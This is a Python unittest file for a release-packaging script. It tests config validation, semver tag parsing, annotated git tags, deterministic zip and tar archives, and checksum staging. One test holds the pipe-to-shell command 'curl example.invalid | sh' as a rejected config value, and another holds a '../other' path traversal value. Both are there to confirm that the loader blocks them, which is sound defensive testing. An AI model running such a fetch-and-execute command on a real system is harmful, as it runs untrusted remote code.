from __future__ import annotations

import io
import json
import os
import subprocess
import sys
import tarfile
import tempfile
import unittest
import zipfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "scripts"))

from source_release import (
    ReleaseError,
    TARGETS,
    _write_tar_gz,
    _write_zip,
    expected_assets,
    load_config,
    parse_tag,
    stage_release,
    target_matrix,
    validate_source,
)


class SourceReleaseTests(unittest.TestCase):
    def write_config(self, directory: Path, value: dict) -> dict:
        path = directory / "release.json"
        path.write_text(json.dumps(value), encoding="utf-8")
        return load_config(path)

    def test_go_config_is_typed_and_generates_six_native_targets(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            config = self.write_config(
                Path(temporary),
                {
                    "schema": 1,
                    "package": "tool",
                    "binary": "tool",
                    "adapter": "go",
                    "macos_sign": "adhoc",
                    "go": {
                        "ldflags": {
                            "version": "example.com/tool/internal/version.semanticVersion"
                        }
                    },
                },
            )
        self.assertEqual(config["toolchain_file"], "go.mod")
        self.assertEqual(config["version_args"], ["--version"])
        matrix = target_matrix(config["binary"])["include"]
        self.assertEqual(len(matrix), 6)
        self.assertEqual(matrix[0]["executable"], "tool.exe")
        self.assertEqual(matrix[-1]["executable"], "tool")

    def test_rust_config_has_no_arbitrary_command_escape_hatch(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            directory = Path(temporary)
            config = self.write_config(
                directory,
                {
                    "schema": 1,
                    "package": "tool",
                    "binary": "tool",
                    "adapter": "rust",
                    "rust": {"features": ["native-tls"]},
                },
            )
            self.assertEqual(config["rust"]["manifest"], "Cargo.toml")
            with self.assertRaisesRegex(ReleaseError, "unknown keys: command"):
                self.write_config(
                    directory,
                    {
                        "schema": 1,
                        "package": "tool",
                        "binary": "tool",
                        "adapter": "rust",
                        "command": "curl example.invalid | sh",
                    },
                )

    def test_config_rejects_path_traversal_and_mixed_adapters(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            directory = Path(temporary)
            with self.assertRaisesRegex(ReleaseError, "stay inside"):
                self.write_config(
                    directory,
                    {
                        "schema": 1,
                        "package": "tool",
                        "binary": "tool",
                        "adapter": "go",
                        "project_path": "../other",
                    },
                )
            with self.assertRaisesRegex(ReleaseError, "cannot contain rust"):
                self.write_config(
                    directory,
                    {
                        "schema": 1,
                        "package": "tool",
                        "binary": "tool",
                        "adapter": "go",
                        "rust": {},
                    },
                )

    def test_release_tags_accept_stable_and_prerelease_semver(self) -> None:
        self.assertEqual(parse_tag("v1.2.3"), ("1.2.3", True))
        self.assertEqual(parse_tag("v1.2.3-rc.1"), ("1.2.3-rc.1", False))
        for value in ("1.2.3", "v01.2.3", "v1.2", "v1.2.3-"):
            with self.subTest(value=value), self.assertRaises(ReleaseError):
                parse_tag(value)

    def test_source_validation_requires_annotated_reachable_tag(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            directory = Path(temporary)
            config = self.write_config(
                directory,
                {
                    "schema": 1,
                    "package": "tool",
                    "binary": "tool",
                    "adapter": "go",
                },
            )
            for arguments in (
                ["git", "init", "-b", "main"],
                ["git", "config", "user.name", "Release Test"],
                ["git", "config", "user.email", "release-test@example.invalid"],
                ["git", "add", "release.json"],
                ["git", "commit", "-m", "release source"],
                ["git", "tag", "-a", "v1.2.3", "-m", "v1.2.3"],
                ["git", "tag", "v1.2.4"],
                ["git", "remote", "add", "origin", "."],
                ["git", "fetch", "origin", "main:refs/remotes/origin/main"],
            ):
                subprocess.run(arguments, cwd=directory, check=True, capture_output=True)

            previous = Path.cwd()
            try:
                os.chdir(directory)
                values = validate_source(config, "v1.2.3")
                self.assertEqual(values["version"], "1.2.3")
                self.assertEqual(values["stable"], "true")
                self.assertEqual(values["adapter"], "go")
                with self.assertRaisesRegex(ReleaseError, "annotated or signed"):
                    validate_source(config, "v1.2.4")
            finally:
                os.chdir(previous)

    def test_archive_writers_are_deterministic_and_root_only(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            directory = Path(temporary)
            binary = directory / "tool"
            binary.write_bytes(b"binary")
            binary.chmod(0o755)
            for writer, suffix in ((_write_zip, ".zip"), (_write_tar_gz, ".tar.gz")):
                with self.subTest(suffix=suffix):
                    first = directory / f"first{suffix}"
                    second = directory / f"second{suffix}"
                    writer(first, binary, "tool", 1_700_000_000)
                    writer(second, binary, "tool", 1_700_000_000)
                    self.assertEqual(first.read_bytes(), second.read_bytes())
                    if suffix == ".zip":
                        with zipfile.ZipFile(first) as archive:
                            self.assertEqual(archive.namelist(), ["tool"])
                            self.assertEqual(archive.getinfo("tool").external_attr >> 16, 0o755)
                    else:
                        with tarfile.open(first, "r:gz") as archive:
                            members = archive.getmembers()
                            self.assertEqual([member.name for member in members], ["tool"])
                            self.assertEqual(members[0].mode, 0o755)

    def test_stage_requires_exact_assets_and_writes_verified_checksums(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            directory = Path(temporary)
            config = self.write_config(
                directory,
                {
                    "schema": 1,
                    "package": "tool",
                    "binary": "tool",
                    "adapter": "go",
                },
            )
            staging = directory / "staging"
            staging.mkdir()
            for item in TARGETS:
                executable = "tool.exe" if item["goos"] == "windows" else "tool"
                suffix = ".zip" if item["archive"] == "zip" else ".tar.gz"
                archive_path = staging / f"tool_1.2.3_{item['token']}{suffix}"
                if item["archive"] == "zip":
                    with zipfile.ZipFile(archive_path, "w") as archive:
                        archive.writestr(executable, b"binary")
                else:
                    with tarfile.open(archive_path, "w:gz") as archive:
                        info = tarfile.TarInfo(executable)
                        info.mode = 0o755
                        info.size = len(b"binary")
                        archive.addfile(info, io.BytesIO(b"binary"))

            stage_release(config, "1.2.3", staging)
            first = (staging / "checksums.txt").read_bytes()
            stage_release(config, "1.2.3", staging)
            self.assertEqual((staging / "checksums.txt").read_bytes(), first)
            self.assertEqual(
                len((staging / "checksums.txt").read_text(encoding="utf-8").splitlines()),
                6,
            )
            self.assertEqual(len(expected_assets(config, "1.2.3")), 6)

            (staging / expected_assets(config, "1.2.3")[0]).unlink()
            with self.assertRaisesRegex(ReleaseError, "release assets differ"):
                stage_release(config, "1.2.3", staging)


if __name__ == "__main__":
    unittest.main()
